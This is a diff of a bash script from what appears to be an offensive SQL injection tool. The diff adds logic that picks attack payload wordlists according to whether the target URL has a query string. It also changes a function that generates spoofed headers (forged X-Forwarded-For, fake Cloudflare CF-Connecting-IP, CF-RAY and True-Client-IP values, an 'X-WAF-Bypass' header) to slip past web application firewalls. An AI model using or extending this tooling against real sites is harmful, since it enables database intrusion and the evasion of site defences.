@@ -12,10 +12,18 @@ source "$DEFIANCE_DIR/../tamper/hungry.sh"
 if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
     export WORDLIST_MYSQL="$custom_wordlist"
 else
-    if [ "$nerf_mode" = "true" ]; then
-        export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
+    if [[ "$target_url" != *"?"* ]]; then
+        if [ "$nerf_mode" = "true" ]; then
+            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonnerfphp.txt"
+        else
+            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonphp.txt"
+        fi
     else
-        export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/sqli_defiance.txt"
+        if [ "$nerf_mode" = "true" ]; then
+            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
+        else
+            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/sqli_defiance.txt"
+        fi
     fi
 fi
 
@@ -70,11 +78,19 @@ print_defiance_logo() {
 braindamage() {
     local choice=$((RANDOM % 3))
     local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
-    case "$choice" in
-        0) echo "-H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
-        1) echo "-H Content-Type:application/json;multipart/form-data;boundary=$((RANDOM % 9999)) -H CF-Visitor:{\"scheme\":\"https\"}" ;;
-        2) echo "-H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
-    esac
+    if [[ "$target_url" != *"?"* ]]; then
+        case "$choice" in
+            0) echo "-H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
+            1) echo "-H Content-Type:application/json -H CF-Visitor:{\"scheme\":\"https\"}" ;;
+            2) echo "-H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
+        esac
+    else
+        case "$choice" in
+            0) echo "-H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
+            1) echo "-H Content-Type:application/json;multipart/form-data;boundary=$((RANDOM % 9999)) -H CF-Visitor:{\"scheme\":\"https\"}" ;;
+            2) echo "-H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
+        esac
+    fi
 }
 
 dork() {
